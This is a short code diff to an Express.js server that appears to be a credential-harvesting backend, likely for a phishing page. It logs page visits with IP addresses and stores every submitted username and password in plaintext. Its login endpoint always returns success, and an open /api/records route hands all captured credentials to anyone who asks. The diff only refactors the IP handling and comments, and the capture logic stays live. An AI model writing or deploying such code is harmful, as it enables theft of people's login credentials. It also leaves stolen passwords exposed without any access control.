@@ -23,28 +23,25 @@ function saveRecord(type, username = null, password = null, ip = 'Unknown') {
         [type, username, password, ip, timestamp]);
 }
 
-// Record every click / visit (even before login)
+// Record every visit
 app.get('/', (req, res) => {
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
-    saveRecord('Page Visit', null, null, ip);
+    saveRecord('Page Visit', null, null, req.ip || req.headers['x-forwarded-for']);
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.get('/login.html', (req, res) => {
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
-    saveRecord('Page Visit', null, null, ip);
+    saveRecord('Page Visit', null, null, req.ip || req.headers['x-forwarded-for']);
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
-// Login Attempt
+// Login
 app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
-    saveRecord('Login Attempt', username, password, ip);
+    saveRecord('Login Attempt', username, password, req.ip || req.headers['x-forwarded-for']);
     res.json({ success: true });
 });
 
-// Get all records
+// Get records
 app.get('/api/records', (req, res) => {
     db.all("SELECT * FROM records ORDER BY id DESC", [], (err, rows) => {
         res.json(rows);
